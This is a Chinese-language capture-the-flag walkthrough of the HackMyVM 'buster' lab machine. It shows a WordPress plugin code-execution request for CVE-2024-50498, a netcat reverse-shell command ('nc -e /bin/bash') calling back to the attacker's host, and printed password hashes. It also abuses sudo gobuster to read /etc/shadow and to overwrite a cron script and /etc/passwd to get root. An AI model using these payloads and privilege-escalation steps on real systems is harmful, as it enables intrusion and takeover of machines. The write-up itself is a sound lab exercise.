---
{"dg-publish":true,"title":"hackmyvm_buster","dg-path":"安全/靶机/hackmyvm_buster.md","permalink":"/安全/靶机/hackmyvm_buster/","dgPassFrontmatter":true}
---

# 主机发现

![Pasted image 20250124200157.png](/img/user/picture/Pasted%20image%2020250124200157.png)

开放80端口
![Pasted image 20250124200222.png](/img/user/picture/Pasted%20image%2020250124200222.png)



# web渗透
![Pasted image 20250124200510.png](/img/user/picture/Pasted%20image%2020250124200510.png)
由**wordpress**搭建

![Pasted image 20250125185710.png](/img/user/picture/Pasted%20image%2020250125185710.png)
存在两个用户：
```
ta0
welcome
```

尝试弱密码破解，未果
![Pasted image 20250125190727.png](/img/user/picture/Pasted%20image%2020250125190727.png)

![Pasted image 20250125190717.png](/img/user/picture/Pasted%20image%2020250125190717.png)


## 插件漏洞


```shell
wpscan --url http://。。。/ -e ap --plugins-detection aggressive --api-token xxx 
```

![Pasted image 20250125193432.png](/img/user/picture/Pasted%20image%2020250125193432.png)

POC：
https://github.com/RandomRobbieBF/CVE-2024-50498
```http
POST /wp-json/wqc/v1/query HTTP/1.1
Host: kubernetes.docker.internal
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://kubernetes.docker.internal/wp-admin/admin.php?page=wp-query-console
Content-Type: application/json
Content-Length: 45
Origin: http://kubernetes.docker.internal
Connection: keep-alive
Priority: u=0

{"queryArgs":"phpinfo();","queryType":"post"}
```
![Pasted image 20250125193519.png](/img/user/picture/Pasted%20image%2020250125193519.png)


![Pasted image 20250125194158.png](/img/user/picture/Pasted%20image%2020250125194158.png)
![Pasted image 20250125194206.png](/img/user/picture/Pasted%20image%2020250125194206.png)
确实可以执行


现在进行反弹shell

![Pasted image 20250125194459.png](/img/user/picture/Pasted%20image%2020250125194459.png)
![Pasted image 20250125194506.png](/img/user/picture/Pasted%20image%2020250125194506.png)

成功连接

## 提权

sudo -l需要密码，弄不了


先看一下别的信息
![Pasted image 20250125195026.png](/img/user/picture/Pasted%20image%2020250125195026.png)
配置文件中有数据库信息

![Pasted image 20250125195124.png](/img/user/picture/Pasted%20image%2020250125195124.png)

![Pasted image 20250125195157.png](/img/user/picture/Pasted%20image%2020250125195157.png)

```txt
 ta0          $P$BDDc71nM67DbOVN/U50WFGII6EF6.r.
 welcome      $P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/
```

![Pasted image 20250125195454.png](/img/user/picture/Pasted%20image%2020250125195454.png)

![Pasted image 20250125200005.png](/img/user/picture/Pasted%20image%2020250125200005.png)

```txt
104567
```


![Pasted image 20250125200050.png](/img/user/picture/Pasted%20image%2020250125200050.png)


用pspy64监听一下自动化任务
![Pasted image 20250125205407.png](/img/user/picture/Pasted%20image%2020250125205407.png)
也就是会执行
```bash
/opt/.test.sh
```
![Pasted image 20250125205549.png](/img/user/picture/Pasted%20image%2020250125205549.png)

**利用gobuster读取任意文件**
可以将要读取的文件作为字典
```shell
sudo gobuster -w /opt/.test.sh -u http://192.168.31.92:8000
```

![Pasted image 20250125210451.png](/img/user/picture/Pasted%20image%2020250125210451.png)
在攻击机上就会收到其内容

其实也可以尝试读一下shadow
```shell
root:$6$uvmZZfH41v4CKcWZ$kAglkiLVm6RQYjB/9wZ8GgmbJQqT8QZazoC7hz27tArTJkp7wQZ..0jAnw3BEge9aeN6614uoDeRn5aHvVqc10:20096:0:99999:7:::
```


**利用gobuster写任意文件**

可以先在`/tmp`目录下建一个可执行文件`eval`
```txt
nc -e /bin/bash 192.168.31.92 1234
```
![Pasted image 20250125213144.png](/img/user/picture/Pasted%20image%2020250125213144.png)

我们在靶机上创建目录`/tmp/eval`

可以看到现在执行gobuster的输出结果就是`/tmp/eval`
![Pasted image 20250125213607.png](/img/user/picture/Pasted%20image%2020250125213607.png)

可以设想如果他在自动化任务中的话，也就是`/opt/.test.sh`中，eval文件就会执行，也就是会反弹shell


```shell
sudo gobuster -w wordlist -u http://192.168.31.92:8000 -n -q
 -o /opt/.test.sh
```

成功拿到root
![Pasted image 20250125214438.png](/img/user/picture/Pasted%20image%2020250125214438.png)



# 总结

首先通过wordpress的插件漏洞拿到webshell

通过查看配置文件获取到数据库信息，读取到数据库中welcome的账号密码

靶机也有用户welcome,尝试密码撞库，成功，拿到普通用户权限

查看sudo权限发现有gobuster特权
通过pspy工具了解到有用户层面的自动化任务
![Pasted image 20250125214928.png](/img/user/picture/Pasted%20image%2020250125214928.png)

这个靶场关键点在于怎么利用gobuster进行文件的读写

**首先读：**
可以将要读的文件当作字典，在攻击机上开一个临时web服务，这样就能间接查看文件内容


**写：**
写的思路依靠`-o`参数，也就是可以将结果保存到某个文件中，所以难点就在如何控制gobuster的输出
通过`-n -q`参数，可以实现只输出扫到的目录
也就是说如果我们扫描的目标具有`/a/b/c`目录的话
而我们的字典中有`a/b/c`,这样他的输出就是`/a/b/c`

所以在攻击时将自动化任务文件内容替换为`/tmp/eval`
而这个文件是一个反弹shell的可执行文件
这样我们就能获取rootshell





### 尝试改写/etc/passwd

首先给自己建一个密码
```shell
perl -e 'print crypt("1","aa")'
```
密码的值为 `1`
```txt
aacFCuAIHhrCM
```

所以最后要写入的内容为
```txt
/x:aacFCuAIHhrCM:0:0:x:/root:/bin/bash
```

![Pasted image 20250125222025.png](/img/user/picture/Pasted%20image%2020250125222025.png)


在靶机上建立目录
```shell
mkdir -p 'x:aacFCuAIHhrCM:0:0:x:/root:/bin/bash'
```
这里最后把最后的`bash`删掉，换成一个文件


![Pasted image 20250125222340.png](/img/user/picture/Pasted%20image%2020250125222340.png)

![Pasted image 20250125222446.png](/img/user/picture/Pasted%20image%2020250125222446.png)
也是成功拿到root权限，这种方法可以不借助自动化任务
但是更暴力








